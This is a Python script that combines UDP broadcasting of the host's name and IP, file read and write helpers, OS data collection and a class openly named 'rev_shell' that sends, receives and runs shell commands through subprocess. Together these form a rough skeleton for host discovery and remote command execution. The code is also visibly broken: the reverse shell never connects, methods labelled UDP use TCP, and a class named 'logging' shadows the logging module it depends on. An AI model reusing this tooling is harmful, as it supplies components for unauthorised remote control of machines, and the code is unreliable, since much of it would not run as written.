import os
import socket
import threading
import time
import logging
import sys
import subprocess


class tools:

    def __init__(self, port):
        self.port = port
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)

        # Set up logging
        logging.basicConfig(level=logging.DEBUG, format='%(asctime)s - %(levelname)s - %(message)s')
        self.logger = logging.getLogger(__name__)

    def get_ip_address(self):
        """Get the local IP address of the machine."""
        hostname = socket.gethostname()
        ip_address = socket.gethostbyname(hostname)
        self.logger.info(f"Local IP Address: {ip_address}")
        return ip_address

    def broadcast_data(self):
        """Broadcast the PC name and IP address."""
        hostname = socket.gethostname()
        ip_address = self.get_ip_address()
        message = f"{hostname},{ip_address}"

        while True:
            self.sock.sendto(message.encode(), ('<broadcast>', self.port))
            self.logger.info(f"Broadcasting: {message}")
            time.sleep(5)  # Broadcast every 5 seconds

    def receive_broadcast(self):
        """Listen for incoming broadcast messages."""
        self.sock.bind(('', self.port))  # Bind to all interfaces on the specified port
        self.logger.info(f"Listening for broadcasts on port {self.port}...")

        while True:
            data, addr = self.sock.recvfrom(1024)  # Buffer size is 1024 bytes
            self.logger.info(f"Received message: {data.decode()} from {addr}")

    def read_file(self, file_path):
        """Read the contents of a file."""
        try:
            with open(file_path, 'r') as file:
                content = file.read()
                self.logger.info(f"Read from {file_path}: {content}")
                return content
        except Exception as e:
            self.logger.error(f"Error reading file {file_path}: {e}")

    def write_file(self, file_path, content):
        """Write content to a file."""
        try:
            with open(file_path, 'w') as file:
                file.write(content)
                self.logger.info(f"Wrote to {file_path}: {content}")
        except Exception as e:
            self.logger.error(f"Error writing to file {file_path}: {e}")

    def collect_os_data(self):
        """Collect basic OS data."""
        os_data = {
            'os_name': os.name,
            'platform': os.uname().sysname,
            'release': os.uname().release,
            'version': os.uname().version,
            'machine': os.uname().machine,
            'processor': os.uname().processor,
        }
        self.logger.info(f"OS Data Collected: {os_data}")
        return os_data

    def start(self):
        """Start broadcasting and receiving in separate threads."""
        broadcast_thread = threading.Thread(target=self.broadcast_data)
        receive_thread = threading.Thread(target=self.receive_broadcast)

        broadcast_thread.start()
        receive_thread.start()

        # Optionally, join the threads if you want to wait for them to finish
        broadcast_thread.join()
        receive_thread.join()

class logging():
    def __init__(self, level=logging.DEBUG):
        self.level = level
        logging.basicConfig(level=self.level, format='%(asctime)s - %(levelname)s - %(message)s')
        self.logger = logging.getLogger(__name__)

    def log(self, message):
        self.logger.debug(message)

    def log_error(self, message):
        self.logger.error(message)

    def log_info(self, message):
        self.logger.info(message)


class rev_shell():
    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.logger = logging.getLogger(__name__)
        self.logger.info(f"Reverse shell initialized for {host}:{port}")

    def recieve_cmd_udp(self):
        """Receive data from the socket."""
        while True:
            try:
                data = self.sock.recv(1024)
                if not data:
                    break
                self.logger.info(f"Received data: {data.decode()}")
            except Exception as e:
                self.logger.error(f"Error receiving data: {e}")
                break

    def send_cmd_udp(self, cmd):
        """Send a command to the remote host."""
        try:
            self.sock.sendall(cmd.encode())
            self.logger.info(f"Sent command: {cmd}")
        except Exception as e:
            self.logger.error(f"Error sending command: {e}")

    def execute_cmd(self, cmd):
        """Execute a command on the remote host."""
        try:
            process = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            output, error = process.communicate()
            if output:
                self.logger.info(f"Command output: {output.decode()}")
            if error:
                self.logger.error(f"Command error: {error.decode()}")
        except Exception as e:
            self.logger.error(f"Error executing command: {e}")


if __name__ == "__main__":
    # Example usage
    port = 12345
    tool = tools(port)
    tool.start()
